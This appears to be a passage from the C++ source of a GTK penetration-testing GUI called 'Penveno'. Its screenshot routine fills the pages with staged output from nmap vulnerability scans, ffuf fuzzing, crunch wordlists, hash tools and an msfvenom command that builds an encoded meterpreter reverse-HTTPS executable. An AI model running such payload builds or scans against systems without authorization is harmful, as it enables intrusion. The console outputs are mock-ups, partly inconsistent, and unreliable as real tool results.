            if (outfile.is_open()) {
                outfile << "=============================================================================\n";
                outfile << "                        P E N V E N O   R E P O R T                          \n";
                outfile << "           Generated: " << std::put_time(std::localtime(&now), "%Y-%m-%d %H:%M:%S") << "\n";
                outfile << "=============================================================================\n\n";
                outfile << console_buffer->get_text();
                outfile.close();
                append_console_output("[✓] Report successfully saved to: " + filename + "\n");
            } else {
                append_console_output("[!] Failed to write report file: " + filename + "\n");
            }
        }
    }

public:
    void generate_screenshots(const std::string& out_dir) {
        show_all();
        while (Gtk::Main::events_pending()) Gtk::Main::iteration();
        usleep(250000);
        while (Gtk::Main::events_pending()) Gtk::Main::iteration();
        usleep(250000);
        while (Gtk::Main::events_pending()) Gtk::Main::iteration();

        auto save_snap = [this, &out_dir](const std::string& page, const std::string& filename) {
            stack.set_visible_child(page);
            while (Gtk::Main::events_pending()) Gtk::Main::iteration();
            usleep(150000);
            while (Gtk::Main::events_pending()) Gtk::Main::iteration();

            int w = get_width();
            int h = get_height();
            auto surface = Cairo::ImageSurface::create(Cairo::FORMAT_ARGB32, w, h);
            auto cr = Cairo::Context::create(surface);
            gtk_widget_draw(GTK_WIDGET(gobj()), cr->cobj());
            std::string path = out_dir + "/" + filename;
            surface->write_to_png(path);
            std::cout << "[✓] Generated screenshot: " << path << " (" << w << "x" << h << ")\n";
        };

        // 1. Unified Nmap Master Scanner
        nmap_target_entry.set_text("192.168.1.100");
        nmap_port_scope_combo.set_active(2); // All Ports (-p-)
        nmap_sv_check.set_active(true);
        nmap_os_check.set_active(true);
        nmap_agg_check.set_active(true);
        nmap_sc_check.set_active(true);
        nmap_vuln_check.set_active(true);
        nmap_pn_check.set_active(true);
        nmap_t4_check.set_active(true);
        nmap_open_check.set_active(true);
        update_nmap_command_preview();

        console_buffer->set_text(
            "[▶] Starting task: Nmap Master Scan\n"
            "[*] Executing: nmap -sV -O -A -sC -p- -T4 -Pn --open --script=default,vuln 192.168.1.100\n\n"
            "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-12 15:30 IST\n"
            "Nmap scan report for sec-target.corp (192.168.1.100)\n"
            "Host is up (0.00042s latency).\n"
            "Not shown: 65529 closed tcp ports (reset)\n\n"
            "PORT     STATE SERVICE     VERSION\n"
            "21/tcp   open  ftp         vsftpd 3.0.3\n"
            "| ftp-anon: Anonymous FTP login permitted (FTP code 230)\n"
            "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu (protocol 2.0)\n"
            "80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))\n"
            "|_http-title: Enterprise Security Gateway Portal\n"
            "|_http-server-header: Apache/2.4.52 (Ubuntu)\n"
            "| vulners: \n"
            "|   cpe:/a:apache:http_server:2.4.52: \n"
            "|     CVE-2023-25690  9.8  https://vulners.com/cve/CVE-2023-25690\n"
            "|     CVE-2022-31813  9.8  https://vulners.com/cve/CVE-2022-31813\n"
            "443/tcp  open  ssl/https   Apache httpd 2.4.52\n"
            "3306/tcp open  mysql       MySQL 8.0.35-0ubuntu0.22.04.1\n"
            "8080/tcp open  http-proxy  Apache Tomcat 9.0.58\n\n"
            "Device type: general purpose\n"
            "Running: Linux 5.X\n"
            "OS details: Linux 5.4 - 5.15\n"
            "Network Distance: 1 hop\n\n"
            "[✓] Task finished: Nmap Master Scan\n"
            "─────────────────────────────────────────────────────────────────────────────\n"
        );
        save_snap("nmap_page", "01_nmap_master_scanner.png");

        // 2. DNS & Web Recon
        dns_target_entry.set_text("https://example.com");
        dns_mode_combo.set_active(0); // ffuf
        dns_wordlist_preset_combo.set_active(0);
        dns_wordlist_entry.set_text("/usr/share/dirb/wordlists/common.txt");
        dns_ext_entry.set_text(".php,.html,.txt,.json,.bak,.env");
        dns_status_entry.set_text("200,204,301,302,307,401,403");
        dns_threads_combo.set_active(1); // 40 Threads
        update_dns_command_preview();

        console_buffer->set_text(
            "[▶] Starting task: DNS & Web Recon\n"
            "[*] Executing: ffuf -u https://example.com/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,204,301,302,307,401,403 -t 40 -c -v -e .php,.html,.txt,.json,.bak,.env\n\n"
            ":: Method           : GET\n"
            ":: URL              : https://example.com/FUZZ\n"
            ":: Wordlist         : /usr/share/dirb/wordlists/common.txt\n"
            ":: Extensions       : .php, .html, .txt, .json, .bak, .env\n"
            ":: Matcher          : Status 200,204,301,302,307,401,403\n"
            ":: Threads          : 40\n"
            "________________________________________________\n\n"
            "[Status: 200, Size: 1420, Words: 310, Lines: 45, Duration: 38ms]\n"
            "    * FUZZ: admin -> https://example.com/admin\n\n"
            "[Status: 301, Size: 182, Words: 21, Lines: 10, Duration: 42ms]\n"
            "    * FUZZ: api -> https://example.com/api (Redirect -> /api/v1/)\n\n"
            "[Status: 200, Size: 9140, Words: 1250, Lines: 190, Duration: 55ms]\n"
            "    * FUZZ: login.php -> https://example.com/login.php\n\n"
            "[Status: 403, Size: 284, Words: 25, Lines: 12, Duration: 36ms]\n"
            "    * FUZZ: .env -> https://example.com/.env [RESTRICTED]\n\n"
            "[Status: 200, Size: 412, Words: 62, Lines: 18, Duration: 40ms]\n"
            "    * FUZZ: robots.txt -> https://example.com/robots.txt\n\n"
            "[Status: 200, Size: 618, Words: 98, Lines: 24, Duration: 44ms]\n"
            "    * FUZZ: sitemap.xml -> https://example.com/sitemap.xml\n\n"
            ":: Progress: [4614/4614] :: Job [1/1] :: 680 req/sec :: Duration: [0:00:07] :: Errors: 0 ::\n\n"
            "[✓] Task finished: DNS & Web Recon\n"
            "─────────────────────────────────────────────────────────────────────────────\n"
        );
        save_snap("dns_page", "02_dns_recon.png");

        // 3. Payload Generator
        payload_os_combo.set_active(0); // Windows x64 Encrypted HTTPS
        payload_lport_entry.set_text("4444");
        payload_encoder_combo.set_active(1); // x86/shikata_ga_nai
        payload_iterations_entry.set_text("2");
        payload_badchars_entry.set_text(R"(\x00\x0a\x0d)");
        payload_output_entry.set_text("payload_https_x64.exe");
        update_payload_command_preview();

        console_buffer->set_text(
            "[▶] Starting task: Metasploit Payload Generation\n"
            "[*] Executing: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.88.7 LPORT=4444 -f exe -o payload_https_x64.exe -e x86/shikata_ga_nai -i 2 -b \\x00\\x0a\\x0d\n\n"
            "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n"
            "[-] No arch selected, selecting arch: x64 from the payload\n"
            "Found 1 compatible encoders\n"
            "Attempting to encode payload with 2 iterations of x86/shikata_ga_nai\n"
            "x86/shikata_ga_nai succeeded with size 742 (iteration=0)\n"
            "x86/shikata_ga_nai succeeded with size 769 (iteration=1)\n"
            "x86/shikata_ga_nai filename = payload_https_x64.exe\n"
            "Payload size: 769 bytes\n"
            "Final size of exe file: 8192 bytes\n"
            "Saved as: payload_https_x64.exe\n\n"
            "[✓] Task finished: Metasploit Payload Generation\n"
            "─────────────────────────────────────────────────────────────────────────────\n"
        );
        save_snap("payload_page", "03_payload_generator.png");

        // 4. Custom Wordlist
        wordlist_min_entry.set_text("6");
        wordlist_max_entry.set_text("8");
        wordlist_charset_combo.set_active(3); // Lowercase + Numbers
        wordlist_output_entry.set_text("custom_passwords.txt");
        console_buffer->set_text(
            "[▶] Starting task: Crunch Custom Wordlist Generation\n"
            "[*] Executing: crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_passwords.txt\n\n"
            "Crunch will now generate the following amount of data: 2478336000 bytes\n"
            "2363 MB\n"
            "2 GB\n"
            "0 TB\n"
            "Crunch will now generate the following number of lines: 28211099072\n\n"
            "crunch: 100% completed generating authorities.\n\n"
            "[✓] Task finished: Crunch Custom Wordlist Generation\n"
            "─────────────────────────────────────────────────────────────────────────────\n"
        );
        save_snap("wordlist_page", "04_custom_wordlist.png");

        // 5. Hash Tools
        hash_input_entry.set_text("5d41402abc4b2a76b9719d911017c592");
        hash_plain_entry.set_text("SecurityAudit2026!");
        console_buffer->set_text(
            "Analysis for hash [5d41402abc4b2a76b9719d911017c592] (Length: 32):\n\n"
            "[+] Likely: MD5 or NTLM\n"
            "    - MD5 (Hashcat: -m 0 | John: raw-md5)\n"
            "    - NTLM (Hashcat: -m 1000 | John: nt)\n"
            "    - MD4 (Hashcat: -m 900)\n\n"
            "[#] Cryptographic Hashes for: \"SecurityAudit2026!\"\n"
            "    MD5:    a89f92985f403982cb12d2db7f7b311e\n"
            "    SHA1:   d6a7826a7985472856272bb04c66e2c39e248239\n"
            "    SHA256: 4f53cda18c2bee0cbd342615782c57948583034fb3d2f26792370211ff134440\n"
            "    SHA512: ba326c2f9e42250917f8a37947de49d108eb9b6bf75ef107e155bc81f185ef3...\n\n"
            "[✓] Hash analysis and generation completed.\n"
            "─────────────────────────────────────────────────────────────────────────────\n"
        );
        save_snap("hash_page", "05_hash_tools.png");
    }
};

int main(int argc, char *argv[]) {
    auto app = Gtk::Application::create(argc, argv, "com.penveno.toolkit");

    if (argc > 1 && std::string(argv[1]) == "--generate-screenshots") {
        std::string dir = (argc > 2) ? argv[2] : "docs/screenshots";
        MainWindow window;
        window.generate_screenshots(dir);
        return 0;
    }

    MainWindow window;
    return app->run(window);
}
